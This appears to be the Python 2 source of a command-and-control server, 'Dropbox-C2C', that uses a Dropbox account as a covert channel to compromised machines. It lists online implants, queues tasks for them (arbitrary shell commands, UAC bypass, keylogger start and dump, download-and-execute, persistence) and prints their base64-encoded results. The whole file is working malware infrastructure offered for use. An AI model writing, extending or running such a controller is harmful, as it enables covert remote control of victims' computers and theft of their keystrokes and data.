import os
import dropbox
import time
import threading
import cmd
import json
import base64


apiKey = "CHANGE API KEY"



banner = """
$$$$$$$\                                $$\                                    $$$$$$\   $$$$$$\   $$$$$$\  
$$  __$$\                               $$ |                                  $$  __$$\ $$  __$$\ $$  __$$\ 
$$ |  $$ | $$$$$$\   $$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\         $$ /  \__|\__/  $$ |$$ /  \__|
$$ |  $$ |$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ \$$\ $$  |$$$$$$\ $$ |       $$$$$$  |$$ |      
$$ |  $$ |$$ |  \__|$$ /  $$ |$$ /  $$ |$$ |  $$ |$$ /  $$ | \$$$$  / \______|$$ |      $$  ____/ $$ |      
$$ |  $$ |$$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ | $$  $$<          $$ |  $$\ $$ |      $$ |  $$\ 
$$$$$$$  |$$ |      \$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$  |$$  /\$$\         \$$$$$$  |$$$$$$$$\ \$$$$$$  |
\_______/ \__|       \______/ $$  ____/ \_______/  \______/ \__/  \__|         \______/ \________| \______/ 
                              $$ |                                                                          
                              $$ |                                                                          
                              \__|                                                                          

                              """


# Create a dropbox object

dbx = dropbox.Dropbox(apiKey)

offlineAgents = []
activeAgents = []
completedTasks = {}
interactedAgent = ""
taskLock = False



# This is the agent Checker
def isInsideTimeline(agent):
	try:
		md, res = dbx.files_download('/%s/lasttime' % agent)
		agenttime = float(res.content.strip())
		servertime = float(time.time())
		if(servertime-60)<=agenttime:
			return True
		else:
			return False
	except dropbox.exceptions.HttpError as err:

		print('[-] HTTP error ', err)
		return False



class TaskChecker(object):

	def __init__(self, interval=5):

		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True                            
		thread.start()                                  

	def run(self):
		while True:
			checkCompletedTasks()
			time.sleep(self.interval)

def dropboxFileExists(path,file):
	for fileName in dbx.files_list_folder(path).entries:
		if fileName.name == file:
			return True
	return False

def checkCompletedTasks():

	for agent in activeAgents:
		path = '/%s/output' % agent
		try:
			if(dropboxFileExists('/%s/' % agent ,'output')):
				_, res = dbx.files_download(path)
				if(res.content != ""):
					outputData = json.loads(res.content.replace('\n',''))
				else:
					outputData = {}
				for data in outputData:
					if(data not in completedTasks[agent]):
						completedTasks[agent].append(data)
						print "\n==== Agent " + agent + " Task: " + data + " ==== "
						print base64.b64decode(outputData[data]["OUTPUT"])
						taskUpdater(agent)

			
		except Exception, err:
			print "[-] Error Receiving Completed Tasks [-]" 
			print err
			pass


def taskUpdater(agent):
	tasks = {}
	path = '/%s/tasks' % agent
	mode = (dropbox.files.WriteMode.overwrite)
	try:	
		_, res = dbx.files_download(path)
		if(res.content != ""):
			tasks = json.loads(res.content.replace('\n',''))
		else:
			tasks = {}
		for completedTask in completedTasks[agent]:
			tasks[completedTask]["STATUS"] = "Completed"
		dbx.files_upload(json.dumps(tasks),path,mode)

	except Exception, err:
		print "[-] Error Updating Tasks [-]"
		print err
		pass


def sendTask(agent,command):

	tasks = {}
	path = '/%s/tasks' % agent
	mode = (dropbox.files.WriteMode.add)
	defaultStatus = "Waiting"

	for file in dbx.files_list_folder('/%s/' % agent).entries:

		if(file.name == 'tasks'):
			mode = (dropbox.files.WriteMode.overwrite)
			_, res = dbx.files_download(path)
			if(res.content != ""):
				tasks = json.loads(res.content.replace('\n',''))
			else:
				tasks = {}
			break
	numberOfTasks = 0
	for task in tasks:
		numberOfTasks += 1
	tasks[numberOfTasks+1] = {"STATUS":defaultStatus,"COMMAND":command}
	try:
		dbx.files_upload(json.dumps(tasks),path,mode)
	except Exception:
		print "[-] Error Sending Task [-]"
		pass



class AgentChecker(object):

	def __init__(self, interval=10):

		self.interval = interval
		thread = threading.Thread(target=self.run, args=())
		thread.daemon = True                           
		thread.start()                                 

	def run(self):
		# This will list all the folders which are created by the agents.
		global activeAgents
		while True:
			
			try:
				for agent in dbx.files_list_folder('').entries:
					agent = agent.name
					if(agent not in activeAgents and isInsideTimeline(agent)):
						activeAgents.append(agent)
						print "[+] Agent " + agent + " is online [+]"
						completedTasks[agent] = [] # NEW CODEEEE
					elif(agent in activeAgents and not isInsideTimeline(agent)):
						activeAgents.remove(agent)
						del completedTasks[agent] # NEW CODEEEEE
						print "\n[+] Agent " + agent + " is offline [+]"
				time.sleep(self.interval)
			
			except Exception:
				print "[-] HTTP Error [-]"
				time.sleep(30)
				pass



def listAgents():
	print "\n[+] Listing Agents [+]"
	if(len(activeAgents) > 0):
		for agent in activeAgents:
			print agent
	else:
		print "[-] No online agents found. [-]"
	print "\n"

def changeInteractedAgent(agent):
	global interactedAgent
	interactedAgent = agent


class Input(cmd.Cmd):

	AGENTS = activeAgents
	prompt = "C2C#> "
	def do_agents(self,s):
		listAgents()
	def do_interact(self,agent):
		self.AGENTS = activeAgents
		if(agent in self.AGENTS):
			print "[+] Interacting with : " + agent + " [+]"
			changeInteractedAgent(agent)
			agentInteraction = AgentCMD()
			agentInteraction.prompt = self.prompt + "(" + agent + "): "
			agentInteraction.cmdloop()
		else:
			print "[-] Agent not valid [-]"

	def complete_interact(self, text, line, begidx, endidx):
		if not text:
			completions = self.AGENTS[:]
		else:
			completions = [ f
			for f in self.AGENTS
			if f.startswith(text)
			]
		return completions
	def do_quit(self,s):
		exit(0)
	def emptyline(self):
		pass


def getInteractedAgent():
	global interactedAgent
	return interactedAgent


class AgentCMD(cmd.Cmd):

	# This is the Agent command line .
	def do_sysinfo(self,s):
		sendTask(interactedAgent,"{SHELL}systeminfo")
	def do_bypassuac(self,s):
		sendTask(interactedAgent,"bypassuac")
	def do_keylog_start(self,s):
		sendTask(interactedAgent,"keylog_start")
	def do_keylog_stop(self,s):
		sendTask(interactedAgent,"keylog_stop")
	def do_keylog_dump(self,s):
		sendTask(interactedAgent,"keylog_dump")
	def do_exec(self,s):
		sendTask(interactedAgent,"{SHELL}%s" % s)
	def do_downloadexecute(self,s):
		sendTask(interactedAgent,"{DOWNLOAD}%s" % s)
	def do_persist(self,s):
		sendTask(interactedAgent,"persist")
	def do_back(self,s):
		interactedAgent = ""
		return True
	def emptyline(self):
		pass


def main():
	print banner

	agents = AgentChecker()
	checker = TaskChecker()
	commandInputs = Input().cmdloop()
	

if __name__ == "__main__":
	main()
